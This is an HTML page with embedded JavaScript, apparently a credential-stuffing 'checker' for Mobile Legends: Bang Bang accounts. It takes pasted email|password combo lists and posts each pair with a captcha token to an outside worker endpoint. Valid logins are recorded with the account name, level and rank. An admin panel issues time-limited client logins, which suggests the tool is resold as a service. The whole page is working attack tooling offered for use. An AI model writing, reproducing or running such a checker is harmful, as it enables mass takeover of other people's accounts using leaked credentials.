<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>MLBB Checker Admin & Client</title>
<style>
  body { font-family: Arial; background:#121212; color:#eee; max-width: 900px; margin:auto; padding:20px; }
  input, button, textarea { padding:8px; margin:4px 0; border-radius:4px; border:1px solid #333; background:#1e1e1e; color:#eee; width:100%; }
  button { cursor:pointer; }
  .admin, .client { border:1px solid #444; padding:10px; margin-top:20px; border-radius:6px; }
  #log { height:200px; overflow-y:auto; background:#000; padding:10px; white-space:pre-wrap; margin-top:10px; border:1px solid #333; }
  .ok { color: #7CFC00; }
  .bad { color: #FF6B6B; }
  .info { color: #FFD866; }
</style>
</head>
<body>

<h2>MLBB Checker Admin & Client Panel</h2>

<div class="admin">
  <h3>Admin Panel</h3>
  <input id="adminPass" type="password" placeholder="Admin password">
  <button id="loginAdmin">Login as Admin</button>
  
  <div id="adminControls" style="display:none;">
    <input id="clientUsername" placeholder="Client username">
    <input id="clientPassword" placeholder="Client password">
    <input id="clientExpiry" type="number" placeholder="Expiry (minutes)">
    <button id="generateClient">Generate Client</button>
    <h4>Generated Clients:</h4>
    <div id="clientsList"></div>
  </div>
</div>

<div class="client">
  <h3>Client Login</h3>
  <input id="loginUsername" placeholder="Username">
  <input id="loginPassword" placeholder="Password">
  <button id="loginClient">Login</button>
  <div id="clientTimer" style="margin-top:10px;"></div>
</div>

<div class="checker" style="display:none;">
  <h3>MLBB Checker</h3>
  <textarea id="combo" placeholder="user1@example.com|Pass123\nuser2@example.com|Pass456"></textarea>
  <button id="startBtn">Start Checking</button>
  <button id="stopBtn" disabled>Stop</button>
  <div id="status" style="margin-top:10px;"></div>
  <div id="captcha-root"></div>
  <div id="log"></div>
</div>

<script>
/* ----------------- Admin / Client Management ----------------- */
const ADMIN_PASSWORD = "admin123"; // ganti sesuai kebutuhan
let clients = JSON.parse(localStorage.getItem("clients")||"[]");

function renderClients() {
  const list = document.getElementById("clientsList");
  list.innerHTML = "";
  clients.forEach(c=>{
    const expiry = new Date(c.expiry).toLocaleString();
    list.innerHTML += `<div>${c.username} | expires: ${expiry}</div>`;
  });
}
renderClients();

document.getElementById("loginAdmin").addEventListener("click",()=>{
  const pass = document.getElementById("adminPass").value;
  if(pass===ADMIN_PASSWORD){
    document.getElementById("adminControls").style.display="block";
    alert("Admin logged in");
  } else alert("Wrong password");
});

document.getElementById("generateClient").addEventListener("click",()=>{
  const u = document.getElementById("clientUsername").value.trim();
  const p = document.getElementById("clientPassword").value.trim();
  const m = parseInt(document.getElementById("clientExpiry").value);
  if(!u||!p||!m){ alert("Fill all fields"); return; }
  const expiry = Date.now() + m*60*1000;
  clients.push({username:u,password:p,expiry});
  localStorage.setItem("clients",JSON.stringify(clients));
  renderClients();
  alert("Client generated");
});

/* ----------------- Client Login & Timer ----------------- */
let clientLogged = null;
let timerInterval=null;

document.getElementById("loginClient").addEventListener("click",()=>{
  const u = document.getElementById("loginUsername").value.trim();
  const p = document.getElementById("loginPassword").value.trim();
  const now = Date.now();
  const client = clients.find(c=>c.username===u && c.password===p);
  if(!client){ alert("Invalid credentials"); return; }
  if(client.expiry<now){ alert("Account expired"); return; }
  clientLogged = client;
  document.querySelector(".checker").style.display="block";
  startClientTimer();
});

function startClientTimer(){
  if(timerInterval) clearInterval(timerInterval);
  timerInterval = setInterval(()=>{
    const now = Date.now();
    const remain = clientLogged.expiry - now;
    if(remain<=0){
      clearInterval(timerInterval);
      alert("Your session expired");
      location.reload();
    } else {
      const m=Math.floor(remain/60000);
      const s=Math.floor((remain%60000)/1000);
      document.getElementById("clientTimer").textContent=`Time left: ${m}m ${s}s`;
    }
  },1000);
}

/* ----------------- MLBB Checker ----------------- */
const CAPTCHA_ID = "fef5c67c39074e9d845f4bf579cc07af"; 
const WORKER_URL = "https://bebas.bonar7527.workers.dev"; 

let combos=[], currentIndex=0, stopRequested=false, neCaptchaInstance=null, validResults=[];

const logEl=document.getElementById("log"), statusEl=document.getElementById("status");
const startBtn=document.getElementById("startBtn"), stopBtn=document.getElementById("stopBtn");
const comboTextarea=document.getElementById("combo");

function appendLog(text,cls){
  const time=new Date().toLocaleTimeString();
  const div=document.createElement("div"); div.textContent=`[${time}] ${text}`;
  if(cls) div.className=cls; logEl.appendChild(div); logEl.scrollTop=logEl.scrollHeight;
}

function parseCombos(text){ return text.split(/\r?\n/).map(l=>l.trim()).filter(Boolean).map(line=>{
  let e,p; if(line.includes("|")) [e,p]=line.split("|",2); else if(line.includes(":")) [e,p]=line.split(":",2); else {appendLog(`Format salah: ${line}`,"info"); return null;}
  return {email:e.trim(),password:p.trim()};
}).filter(Boolean);}

async function showCaptchaOnce(){ 
  return new Promise((resolve,reject)=>{
    const root=document.getElementById("captcha-root"); root.innerHTML="";
    if(!window.initNECaptcha){ appendLog("initNECaptcha missing","info"); reject("missing"); return;}
    if(neCaptchaInstance?.destroy) neCaptchaInstance.destroy();
    initNECaptcha({
      captchaId: CAPTCHA_ID, element:"#captcha-root", mode:"embed", width:"320px",
      onVerify(err,data){
        if(err){ appendLog("Captcha error:"+err,"info"); reject(err); return;}
        if(!data?.validate){ appendLog("Token kosong","info"); reject("no token"); return;}
        neCaptchaInstance.destroy(); neCaptchaInstance=null; resolve(data.validate);
      },
      onLoad(instance){ neCaptchaInstance=instance; }
    });
  });
}

async function checkOneAccount(account){
  appendLog(`Minta captcha untuk ${account.email}`,"info"); statusEl.textContent=`Checking ${currentIndex+1}/${combos.length}: ${account.email}`;
  let token; try{ token=await showCaptchaOnce(); }catch(e){ appendLog(`Captcha gagal: ${e}`,"bad"); return;}
  appendLog("Token diterima","info");
  try{
    const form=new URLSearchParams(); form.append("email",account.email); form.append("password",account.password); form.append("e_captcha",token);
    const resp=await fetch(WORKER_URL+"/check",{method:"POST",body:form,headers:{"Content-Type":"application/x-www-form-urlencoded"}});
    if(!resp.ok){ appendLog(`HTTP error ${resp.status}`,"bad"); return;}
    const data=await resp.json();
    if(data.code===0 && data.data){ 
      const info=data.data; const line=`${info.email}:${info.password} | Name:${info.name} | Level:${info.level} | Rank:${info.rank_level}`; 
      appendLog(`VALID => ${line}`,"ok"); validResults.push(line);
    } else appendLog(`FAIL => ${account.email} | ${JSON.stringify(data)}`,"bad");
  } catch(e){ appendLog(`Error pengecekan ${account.email}: ${e}`,"bad"); }
}

async function startProcess(){ 
  stopRequested=false; startBtn.disabled=true; stopBtn.disabled=false; logEl.innerHTML=""; validResults=[]; combos=parseCombos(comboTextarea.value);
  if(combos.length===0){ appendLog("Tidak ada akun","info"); startBtn.disabled=false; stopBtn.disabled=true; return;}
  currentIndex=0; while(currentIndex<combos.length){
    if(stopRequested){ appendLog("Dihentikan user","info"); break;}
    const acc=combos[currentIndex]; await checkOneAccount(acc);
    combos.splice(currentIndex,1); comboTextarea.value=combos.map(c=>`${c.email}:${c.password}`).join("\n");
  }
  appendLog("Selesai","info"); statusEl.textContent="Selesai"; startBtn.disabled=false; stopBtn.disabled=true;
}

startBtn.addEventListener("click",startProcess);
stopBtn.addEventListener("click",()=>{ stopRequested=true; stopBtn.disabled=true; });

</script>
</body>
</html>
